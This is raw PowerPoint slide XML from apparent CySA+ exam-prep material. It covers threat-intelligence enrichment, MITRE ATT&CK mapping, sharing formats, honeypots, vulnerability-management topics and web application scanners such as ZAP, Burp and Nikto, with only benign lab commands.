          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Build a small enrichment script (SOAR primitive)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>This is a SOAR playbook in miniature: one IOC in, multiple sources queried, structured output ready to feed a ticket.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; /tmp/enrich.sh &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Map a behaviour to MITRE ATT&amp;CK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Open the MITRE ATT&amp;CK Navigator in your browser: https://mitre-attack.github.io/attack-navigator/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 3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41" name="TextBox 4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2" name="TextBox 4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313</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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1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10 — Hands-On Steps (cont'd)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39293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39293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05840" y="22509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2250948"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Recognise threat-actor categories (CySA+ 1.4 vocab)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Match an IOC to the most likely actor before you decide containment urgency.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3304032"/>
            <a:ext cx="10634472" cy="139293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304032"/>
            <a:ext cx="91440" cy="139293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05840" y="377190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05840" y="3771900"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3304032"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Threat-intelligence sharing formats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Real-world feeds use STIX/TAXII; the indicators travel between CERT, CSIRT, ISACs, and commercial paid feeds.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726180"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726180"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ echo "203.0.113.99,malicious,c2,2026-05-13" &gt;&gt; /tmp/iocs.csv</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4824984"/>
            <a:ext cx="10634472" cy="139293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240" y="4824984"/>
            <a:ext cx="91440" cy="139293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005840" y="5292852"/>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05840" y="5292852"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4824984"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Active defense and honeypots</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The defensive end of threat intelligence is deception.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5247132"/>
            <a:ext cx="3977639" cy="5486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452360" y="5247132"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt install -y netcat-openbsd</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314</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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10 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Enrich an IP with WHOIS, AbuseIPDB, and reverse DNS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Build a one-shot SOAR enrichment script.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Map observed behaviour to MITRE ATT&amp;CK techniques.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Categorise threat actors and recognise the major sharing feeds and formats.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315</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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RECAP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Recap — Security Operations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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  OS &amp; software security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Logging &amp; log ingestion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Network architecture &amp; segmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identity &amp; access management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Encryption &amp; active defence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Indicators of malicious activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Packet &amp; traffic analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Email analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Threat intelligence &amp; MITRE ATT&amp;CK</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316</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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2 · 30% OF CS0-003</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Vulnerability Management</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2</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317</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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EXAM WEIGHTING 30%</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Topic 2 Overview — Vulnerability Management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768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Asset discovery &amp; network mapping</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636"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19659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768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vulnerability scanning (OpenVAS/ZAP/Nikto)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240"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2935224"/>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118104"/>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026664"/>
            <a:ext cx="3973068" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Analysing scan results</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636"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2935224"/>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11810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026664"/>
            <a:ext cx="3973068" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CVSS scoring &amp; prioritisation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240"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087368"/>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427024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178808"/>
            <a:ext cx="3973068" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Web application vulnerabilities (XSS/SQLi)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636"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087368"/>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427024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178808"/>
            <a:ext cx="3973068" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Exploitation with Metasploit</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Rectangle 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240"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 y="5239512"/>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33272" y="5422392"/>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33272"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7</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1764792" y="5330952"/>
            <a:ext cx="3973068" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Patch management &amp; hardening</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Rectangle 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636"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231636"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6487668" y="5422392"/>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487668"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8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7219188" y="5330952"/>
            <a:ext cx="3973068" cy="768096"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Attack surface reconnaissance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 4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48" name="TextBox 4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9" name="TextBox 4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318</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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WEB APPLICATION SCANNERS, PART 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Web Application Scanners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Web application scanners test the security of web apps over HTTP and HTTPS (typically ports 80 and 443), probing for flaws such as injection, cross-site scripting, and misconfigurations in the application layer rather than the underlying host.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  OWASP Zed Attack Proxy (ZAP) is a free, open-source tool that sits as a proxy between the browser client and the server so it can intercept, inspect, and manipulate traffic, and it supports automated scanning.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Burp Suite is also an intercepting proxy but is favored for more manual, granular control during hands-on testing, while Nikto is a fast web server vulnerability scanner that checks for dangerous files, outdated software, and known server misconfigurations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts use these tools to find exploitable web weaknesses before attackers do, since web apps are one of the most common initial-access vectors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You may be asked to match a web-testing tool to its role, for example identifying ZAP or Burp as an intercepting proxy versus Nikto as a web server scanner.</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319</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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WEB APPLICATION SCANNERS, PART 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Web Application Scanners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HTTP/HTTPS protocols</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Ports 80 and 443</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320</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
